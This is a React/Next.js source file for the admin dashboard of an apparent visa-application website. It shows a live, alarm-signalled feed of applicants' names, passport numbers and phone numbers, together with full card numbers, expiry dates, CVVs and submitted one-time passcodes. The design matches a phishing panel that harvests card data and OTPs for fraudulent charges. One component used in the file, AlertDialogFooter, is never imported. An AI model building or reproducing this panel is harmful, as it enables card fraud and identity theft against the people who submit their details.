
"use client";

import { useEffect, useState, useCallback, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { onAuthStateChanged, signOut, User } from 'firebase/auth';
import { collection, onSnapshot, query, orderBy, DocumentData, deleteDoc, doc } from 'firebase/firestore';
import { auth, db } from '@/lib/firebase';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { Loader2, LogOut, User as UserIcon, Calendar, Plane, KeyRound, Smartphone, CreditCardIcon, Lock, Trash2 } from 'lucide-react';
import { format } from 'date-fns';
import { Separator } from '@/components/ui/separator';
import { Badge } from '@/components/ui/badge';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog"

const countryDisplayMap: { [key: string]: string } = {
  pk: 'Pakistan',
  af: 'Afghanistan',
  bd: 'Bangladesh',
  cn: 'China',
  in: 'India',
  id: 'Indonesia',
  ir: 'Iran',
  iq: 'Iraq',
  jp: 'Japan',
  kz: 'Kazakhstan',
  my: 'Malaysia',
  mn: 'Mongolia',
  np: 'Nepal',
  om: 'Oman',
  ph: 'Philippines',
  qa: 'Qatar',
  sa: 'Saudi Arabia',
  sg: 'Singapore',
  kr: 'South Korea',
  lk: 'Sri Lanka',
  sy: 'Syria',
  th: 'Thailand',
  tr: 'Turkey',
  ae: 'United Arab Emirates',
  vn: 'Vietnam',
  usa: "United States",
  ca: "Canada",
  gb: "United Kingdom",
  au: "Australia",
  other: "Other"
};

const travelReasonMap: { [key: string]: string } = {
    tourism: 'Tourism or Visit',
    business: 'Business',
    work: 'Work',
    study: 'Study',
};

export default function AdminDashboardPage() {
  const [user, setUser] = useState<User | null>(null);
  const [orders, setOrders] = useState<DocumentData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const router = useRouter();
  const { toast } = useToast();
  const audioContextRef = useRef<AudioContext | null>(null);
  const isFirstLoadRef = useRef(true);

  const playAlarmSound = useCallback(() => {
    if (typeof window === 'undefined') return;
    if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    const audioContext = audioContextRef.current;
    if (audioContext.state === 'suspended') {
        audioContext.resume();
    }
    const notes = [
        // Ascending arpeggio
        { freq: 261.63, start: 0, duration: 0.2 }, // C4
        { freq: 329.63, start: 0.2, duration: 0.2 }, // E4
        { freq: 392.00, start: 0.4, duration: 0.2 }, // G4
        { freq: 523.25, start: 0.6, duration: 0.4 }, // C5
        
        // Pause
        
        // Descending arpeggio
        { freq: 523.25, start: 1.2, duration: 0.2 }, // C5
        { freq: 392.00, start: 1.4, duration: 0.2 }, // G4
        { freq: 329.63, start: 1.6, duration: 0.2 }, // E4
        { freq: 261.63, start: 1.8, duration: 0.4 }, // C4

         // Repeat with slight variation
        { freq: 293.66, start: 2.4, duration: 0.2 }, // D4
        { freq: 349.23, start: 2.6, duration: 0.2 }, // F4
        { freq: 440.00, start: 2.8, duration: 0.2 }, // A4
        { freq: 587.33, start: 3.0, duration: 0.4 }, // D5

        // Final long note
        { freq: 261.63, start: 3.6, duration: 1.0 }, // C4
    ];

    notes.forEach(({ freq, start: startTime, duration }) => {
        const oscillator = audioContext.createOscillator();
        const gain = audioContext.createGain();

        oscillator.type = 'sine';
        oscillator.frequency.setValueAtTime(freq, audioContext.currentTime + startTime);
        gain.gain.setValueAtTime(0.3, audioContext.currentTime + startTime);

        oscillator.connect(gain);
        gain.connect(audioContext.destination);

        const absoluteStartTime = audioContext.currentTime + startTime;
        const absoluteStopTime = absoluteStartTime + duration;

        gain.gain.exponentialRampToValueAtTime(0.00001, absoluteStopTime);
        oscillator.start(absoluteStartTime);
        oscillator.stop(absoluteStopTime);
    });
  }, []);

  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, (currentUser) => {
      if (currentUser) {
        setUser(currentUser);
      } else {
        router.push('/admin/login');
      }
    });

    return () => unsubscribeAuth();
  }, [router]);

  useEffect(() => {
    if (!user) return;

    const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'));
    const unsubscribeFirestore = onSnapshot(q, (snapshot) => {
      const ordersData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setOrders(ordersData);
      
      if (isFirstLoadRef.current) {
        isFirstLoadRef.current = false;
      } else if (snapshot.docChanges().some(change => change.type === 'added')) {
        playAlarmSound();
        toast({ title: "New Order!", description: "A new visa application has been submitted." });
      }
      setIsLoading(false);

    }, (error) => {
      console.error("Error fetching orders: ", error);
      toast({ title: "Error", description: "Could not fetch orders.", variant: "destructive" });
      setIsLoading(false);
    });

    return () => unsubscribeFirestore();
  }, [user, toast, playAlarmSound]);

  const handleLogout = async () => {
    await signOut(auth);
    toast({ title: "Logged Out", description: "You have been successfully logged out." });
    router.push('/admin/login');
  };

  const handleDeleteOrder = async (orderId: string) => {
    try {
      await deleteDoc(doc(db, "orders", orderId));
      toast({
        title: "Order Deleted",
        description: `Order ${orderId} has been successfully deleted.`,
      });
    } catch (error) {
      console.error("Error deleting order: ", error);
      toast({
        title: "Deletion Failed",
        description: "Could not delete the order. Please try again.",
        variant: "destructive",
      });
    }
  };


  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-16 w-16 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background" onClick={() => audioContextRef.current?.resume()}>
      <header className="sticky top-0 bg-card border-b p-4 flex justify-between items-center">
        <h1 className="text-2xl font-bold">Admin Dashboard</h1>
        <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground">{user?.email}</span>
            <Button onClick={handleLogout} variant="outline" size="sm">
                <LogOut className="mr-2" />
                Logout
            </Button>
        </div>
      </header>
      <main className="p-4 md:p-8">
        <Card>
          <CardHeader>
            <CardTitle>Visa Applications</CardTitle>
            <CardDescription>Showing {orders.length} most recent applications.</CardDescription>
          </CardHeader>
          <CardContent>
            {orders.length === 0 ? (
                <p className="text-muted-foreground text-center py-8">No orders found.</p>
            ) : (
                <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
                    {orders.map(order => (
                        <Card key={order.id} className="flex flex-col">
                            <CardHeader>
                                <CardTitle className="flex items-center justify-between">
                                    <span>{order.fullName}</span>
                                    <Badge variant={order.status === 'paid' ? 'default' : 'destructive'}>{order.status}</Badge>
                                </CardTitle>
                                <CardDescription>{order.email}</CardDescription>
                            </CardHeader>
                            <CardContent className="space-y-3 flex-grow">
                                <div className="flex items-center text-sm">
                                    <Plane className="mr-3 h-4 w-4 text-muted-foreground" />
                                    <span>{countryDisplayMap[order.nationality] || order.nationality} for {travelReasonMap[order.travelReason] || 'N/A'}</span>
                                </div>
                                <div className="flex items-center text-sm">
                                    <Smartphone className="mr-3 h-4 w-4 text-muted-foreground" />
                                    <span>Phone: {order.phone || 'N/A'}</span>
                                </div>
                                 <div className="flex items-center text-sm">
                                    <UserIcon className="mr-3 h-4 w-4 text-muted-foreground" />
                                    <span>Passport: {order.passportNumber}</span>
                                </div>
                                <Separator />
                                <div className="pt-2">
                                    <div className="flex items-center text-sm">
                                        <KeyRound className="mr-3 h-4 w-4 text-muted-foreground" />
                                        <span>Submitted OTP: <span className="font-bold text-accent">{order.submittedOtp || 'N/A'}</span></span>
                                    </div>
                                    <div className="flex items-center text-sm mt-2">
                                        <UserIcon className="mr-3 h-4 w-4 text-muted-foreground" />
                                        <span>Card Name: {order.cardDetails?.cardName || 'N/A'}</span>
                                    </div>
                                    <div className="flex items-center text-sm mt-2 font-mono">
                                        <CreditCardIcon className="mr-3 h-4 w-4 text-muted-foreground" />
                                        <span>{order.cardDetails?.cardNumber || 'N/A'} ({order.cardDetails?.expiryDate || 'N/A'})</span>
                                    </div>
                                    <div className="flex items-center text-sm mt-2 font-mono">
                                        <Lock className="mr-3 h-4 w-4 text-muted-foreground" />
                                        <span>CVV: {order.cardDetails?.cvv || 'N/A'}</span>
                                    </div>
                                </div>
                            </CardContent>
                            <CardFooter className="text-xs text-muted-foreground justify-between items-center">
                                <span className="truncate">ID: {order.id}</span>
                                <div className="flex items-center gap-2">
                                    <span>{order.createdAt?.seconds ? format(new Date(order.createdAt.seconds * 1000), 'PPp') : ''}</span>
                                    <AlertDialog>
                                      <AlertDialogTrigger asChild>
                                        <Button variant="destructive" size="icon" className="h-7 w-7">
                                          <Trash2 className="h-4 w-4" />
                                        </Button>
                                      </AlertDialogTrigger>
                                      <AlertDialogContent>
                                        <AlertDialogHeader>
                                          <AlertDialogTitle>Are you absolutely sure?</AlertDialogTitle>
                                          <AlertDialogDescription>
                                            This action cannot be undone. This will permanently delete the order
                                            for {order.fullName} and remove the data from our servers.
                                          </AlertDialogDescription>
                                        </AlertDialogHeader>
                                        <AlertDialogFooter>
                                          <AlertDialogCancel>Cancel</AlertDialogCancel>
                                          <AlertDialogAction onClick={() => handleDeleteOrder(order.id)}>
                                            Yes, delete order
                                          </AlertDialogAction>
                                        </AlertDialogFooter>
                                      </AlertDialogContent>
                                    </AlertDialog>
                                </div>
                            </CardFooter>
                        </Card>
                    ))}
                </div>
            )}
          </CardContent>
        </Card>
      </main>
    </div>
  );
}
